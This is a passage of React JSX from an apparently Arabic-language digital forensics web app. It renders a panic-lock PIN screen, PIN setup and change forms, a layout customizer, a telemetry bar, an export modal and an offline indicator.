            ? 'border-red-500 text-red-200'
            : statusToast?.type === 'warning'
            ? 'border-amber-500 text-amber-200'
            : 'border-[#D4AF37]'
        }`}>
          <CheckCircle2 className={`w-4 h-4 shrink-0 ${statusToast?.type === 'error' ? 'text-red-400' : 'text-[#D4AF37]'}`} />
          <span className="leading-relaxed">{statusToast?.message || update.toastMessage}</span>
          {statusToast && (
            <button
              type="button"
              onClick={() => setStatusToast(null)}
              className="mr-1 text-gray-400 hover:text-white shrink-0 cursor-pointer"
              aria-label="إغلاق التنبيه"
            >
              <X className="w-3.5 h-3.5" />
            </button>
          )}
        </div>
      )}

      {/* Panic Lock & Auto-Lock Screen Overlay */}
      {authReady && user && isLocked && (
        <div className="fixed inset-0 z-[100] bg-[#0b0f19]/98 flex items-center justify-center p-4 backdrop-blur-2xl animate-in fade-in duration-300">
          <div className="max-w-md w-full bg-gray-900 border border-gray-800 rounded-3xl p-8 shadow-2xl text-center space-y-6 relative overflow-hidden">
            <div className={`absolute top-0 left-0 right-0 h-1.5 ${hasUserPin ? 'bg-gradient-to-r from-red-500 via-[#D4AF37] to-red-500 animate-pulse' : 'bg-gradient-to-r from-[#D4AF37] via-emerald-500 to-[#D4AF37]'}`} />
            
            {hasUserPin ? (
              <>
                <div className="w-20 h-20 rounded-2xl bg-red-500/10 border border-red-500/30 flex items-center justify-center mx-auto text-red-400 shadow-xl shadow-red-500/10">
                  <ShieldAlert className="w-10 h-10 animate-bounce" />
                </div>

                <div className="space-y-2">
                  <h2 className="text-xl font-bold text-white tracking-tight">قفل الطوارئ السيادي</h2>
                  <p className="text-xs text-gray-400 leading-relaxed">المنصة مقفلة لحماية الأدلة الرقمية والبيانات الحساسة. أدخل الرمز السري للمتابعة.</p>
                </div>

                {/* Secret Dots Visual Feedback */}
                <div className="flex justify-center items-center gap-3 py-2">
                  {[0, 1, 2, 3, 4, 5].map((idx) => (
                    <div
                      key={idx}
                      className={`w-3.5 h-3.5 rounded-full transition-all duration-300 ${
                        enteredPin.length > idx
                          ? 'bg-[#D4AF37] scale-110 shadow-[0_0_8px_#D4AF37]'
                          : 'bg-gray-800 border border-gray-700/60'
                      }`}
                    />
                  ))}
                </div>

                <form onSubmit={handleUnlock} className="space-y-4">
                  <div className="space-y-2">
                    <input
                      type="password"
                      inputMode="numeric"
                      maxLength={8}
                      value={enteredPin}
                      onChange={(e) => {
                        setEnteredPin(e.target.value);
                        setPinError(null);
                      }}
                      autoComplete="off"
                      autoFocus
                      className="w-full px-4 py-3.5 bg-gray-950 border border-gray-800 rounded-xl text-center font-mono text-2xl text-white tracking-[0.6em] focus:outline-none focus:border-[#D4AF37]"
                      required
                    />
                    {pinError && (
                      <p className="text-xs text-red-400 font-medium">{pinError}</p>
                    )}
                  </div>

                  <button
                    type="submit"
                    className="w-full py-3.5 bg-gradient-to-r from-[#D4AF37] to-[#b8972e] text-gray-950 font-bold rounded-xl shadow-lg hover:opacity-95 transition text-sm cursor-pointer"
                  >
                    إلغاء القفل واستئناف التحقيق
                  </button>
                </form>

                <div className="pt-2 flex items-center justify-center gap-2 text-[10px] text-gray-500 font-mono">
                  <Lock className="w-3 h-3 text-[#D4AF37]" />
                  <span>رمز PIN مشفر بـ SHA-256 ومحمي في Firestore</span>
                </div>
              </>
            ) : (
              <>
                <div className="w-20 h-20 rounded-2xl bg-[#D4AF37]/10 border border-[#D4AF37]/30 flex items-center justify-center mx-auto text-[#D4AF37] shadow-xl shadow-[#D4AF37]/10">
                  <Key className="w-10 h-10 animate-pulse" />
                </div>

                <div className="space-y-2">
                  <h2 className="text-xl font-bold text-white tracking-tight">تعيين رمز PIN السري لقفل الطوارئ</h2>
                  <p className="text-xs text-gray-400 leading-relaxed">
                    لم يتم تعيين رمز سري لحسابك بعد. يرجى إدخال وتأكيد رمز PIN خاص بك لأول مرة لحماية الأدلة، وسيتم تشفيره وحفظه مباشرة في حسابك على Firestore.
                  </p>
                </div>

                <form onSubmit={handleSaveNewPin} className="space-y-4 text-right">
                  <div className="space-y-1.5">
                    <label className="text-[11px] font-bold text-gray-400">رمز PIN السري الجديد</label>
                    <input
                      type="password"
                      inputMode="numeric"
                      maxLength={8}
                      value={setupPin}
                      onChange={(e) => {
                        setSetupPin(e.target.value);
                        setSetupError(null);
                      }}
                      autoComplete="off"
                      className="w-full px-4 py-3 bg-gray-950 border border-gray-800 rounded-xl text-center font-mono text-xl text-white tracking-[0.5em] focus:outline-none focus:border-[#D4AF37]"
                      autoFocus
                      required
                    />
                    <div className="flex justify-center gap-2 pt-1">
                      {[0, 1, 2, 3, 4, 5].map((idx) => (
                        <div
                          key={idx}
                          className={`w-2.5 h-2.5 rounded-full transition-all duration-200 ${
                            setupPin.length > idx ? 'bg-[#D4AF37]' : 'bg-gray-800'
                          }`}
                        />
                      ))}
                    </div>
                  </div>

                  <div className="space-y-1.5">
                    <label className="text-[11px] font-bold text-gray-400">تأكيد رمز PIN السري</label>
                    <input
                      type="password"
                      inputMode="numeric"
                      maxLength={8}
                      value={confirmPin}
                      onChange={(e) => {
                        setConfirmPin(e.target.value);
                        setSetupError(null);
                      }}
                      autoComplete="off"
                      className="w-full px-4 py-3 bg-gray-950 border border-gray-800 rounded-xl text-center font-mono text-xl text-white tracking-[0.5em] focus:outline-none focus:border-[#D4AF37]"
                      required
                    />
                    <div className="flex justify-center gap-2 pt-1">
                      {[0, 1, 2, 3, 4, 5].map((idx) => (
                        <div
                          key={idx}
                          className={`w-2.5 h-2.5 rounded-full transition-all duration-200 ${
                            confirmPin.length > idx ? 'bg-emerald-400' : 'bg-gray-800'
                          }`}
                        />
                      ))}
                    </div>
                  </div>

                  {setupError && (
                    <p className="text-xs text-red-400 font-medium text-center">{setupError}</p>
                  )}

                  <button
                    type="submit"
                    disabled={isSavingPin}
                    className="w-full py-3.5 bg-gradient-to-r from-[#D4AF37] to-[#b8972e] text-gray-950 font-bold rounded-xl shadow-lg hover:opacity-95 transition text-sm cursor-pointer disabled:opacity-50"
                  >
                    {isSavingPin ? 'جاري التشفير والحفظ في Firestore...' : 'تشفير وحفظ رمز PIN'}
                  </button>
                </form>

                <div className="pt-2 text-[10px] text-gray-500 font-mono">
                  Sovereign Forensic Core • SHA-256 Cloud Security
                </div>
              </>
            )}
          </div>
        </div>
      )}

      {/* Manual PIN Change / Setup Modal */}
      {authReady && user && showPinChangeModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-md">
          <div className="max-w-md w-full bg-gray-900 border border-gray-800 rounded-3xl p-6 shadow-2xl space-y-6 relative">
            <div className="flex items-center justify-between pb-3 border-b border-gray-800">
              <div className="flex items-center gap-2">
                <Key className="w-5 h-5 text-[#D4AF37]" />
                <h3 className="text-sm font-bold text-white">إدارة رمز PIN لقفل الطوارئ</h3>
              </div>
              <button
                onClick={() => setShowPinChangeModal(false)}
                className="text-gray-400 hover:text-white text-xs cursor-pointer"
              >
                ✕
              </button>
            </div>

            <form onSubmit={handleSaveNewPin} className="space-y-4 text-right">
              <p className="text-xs text-gray-400 leading-relaxed">
                أدخل رمز PIN السري الجديد (من 4 إلى 8 أرقام). سيتم تشفير الرمز فوراً وحفظه في حسابك على Firestore.
              </p>

              <div className="space-y-1.5">
                <label className="text-[11px] font-bold text-gray-400">رمز PIN الجديد</label>
                <input
                  type="password"
                  inputMode="numeric"
                  maxLength={8}
                  value={setupPin}
                  onChange={(e) => {
                    setSetupPin(e.target.value);
                    setSetupError(null);
                  }}
                  autoComplete="off"
                  className="w-full px-4 py-3 bg-gray-950 border border-gray-800 rounded-xl text-center font-mono text-xl text-white tracking-[0.5em] focus:outline-none focus:border-[#D4AF37]"
                  required
                />
              </div>

              <div className="space-y-1.5">
                <label className="text-[11px] font-bold text-gray-400">تأكيد رمز PIN الجديد</label>
                <input
                  type="password"
                  inputMode="numeric"
                  maxLength={8}
                  value={confirmPin}
                  onChange={(e) => {
                    setConfirmPin(e.target.value);
                    setSetupError(null);
                  }}
                  autoComplete="off"
                  className="w-full px-4 py-3 bg-gray-950 border border-gray-800 rounded-xl text-center font-mono text-xl text-white tracking-[0.5em] focus:outline-none focus:border-[#D4AF37]"
                  required
                />
              </div>

              {setupError && (
                <p className="text-xs text-red-400 font-medium text-center">{setupError}</p>
              )}

              <div className="flex gap-3 pt-2">
                <button
                  type="button"
                  onClick={() => setShowPinChangeModal(false)}
                  className="flex-1 py-3 bg-gray-800 hover:bg-gray-700 text-white font-bold rounded-xl text-xs transition cursor-pointer"
                >
                  إلغاء
                </button>
                <button
                  type="submit"
                  disabled={isSavingPin}
                  className="flex-1 py-3 bg-[#D4AF37] hover:bg-[#b8972e] text-gray-950 font-bold rounded-xl text-xs transition cursor-pointer disabled:opacity-50"
                >
                  {isSavingPin ? 'جاري الحفظ...' : 'حفظ في Firestore'}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}
      {/* Floating Quick Launcher, Telemetry & Workspace Drawers (Authenticated Google Users Only) */}
      {authReady && user && (
        <>
          <button
            type="button"
            onClick={() => setShowLayoutCustomizer(true)}
            title="تخصيص الهيكل والواجهة"
            className="fixed bottom-12 left-5 z-40 no-print flex items-center gap-2 px-4 py-2.5 rounded-full bg-gray-900/95 hover:bg-gray-800 border border-[#D4AF37]/60 text-[#D4AF37] shadow-2xl shadow-black/70 backdrop-blur-md text-xs font-bold transition cursor-pointer"
          >
            <Sliders className="w-4 h-4" />
            <span className="hidden md:inline">تخصيص الهيكل والواجهة</span>
          </button>

          {/* Developer & System Telemetry Log Bar */}
          <DeveloperTelemetryBar
            networkOnline={networkInfo.online}
            activeTab={activeTab}
            logs={telemetryLogs}
          />

          {/* Dynamic Layout & UI Customizer Slide-Over Drawer */}
          <LayoutCustomizerDrawer
            isOpen={showLayoutCustomizer}
            onClose={() => setShowLayoutCustomizer(false)}
            preferences={uiPrefs}
            onUpdatePreferences={updateUiPreferences}
            onResetPreferences={resetUiPreferences}
            syncStatus={uiSyncStatus}
            isCloudAuthenticated={isCloudAuthenticated}
          />

          {/* Mobile / PWA Package Export Modal */}
          <MobilePackageExportModal
            isOpen={showExportModal}
            onClose={() => setShowExportModal(false)}
            onExportLogged={({ fileName, sha256 }) => {
              notifyStatus(`تم تصدير الحزمة (${fileName}) بنجاح | SHA-256: ${sha256.slice(0, 12)}...`, 'success');
            }}
          />
        </>
      )}

      {/* Offline Connectivity Indicator */}
      <OfflineIndicator />
    </div>
  );
}
